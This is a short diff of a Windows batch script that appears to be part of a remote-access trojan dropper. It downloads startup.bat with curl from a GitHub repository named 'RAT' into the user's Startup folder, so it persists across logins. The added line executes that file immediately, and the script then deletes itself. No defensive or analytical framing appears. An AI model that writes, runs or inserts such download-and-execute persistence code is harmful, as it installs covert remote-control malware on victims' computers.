@@ -7,5 +7,6 @@ set "currentd=%cd%"
 
 cd "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 curl -o startup.bat https://raw.githubusercontent.com/saifnasef/RAT/main/startup.bat
+startup.bat
 cd %currentd%
 del third.bat
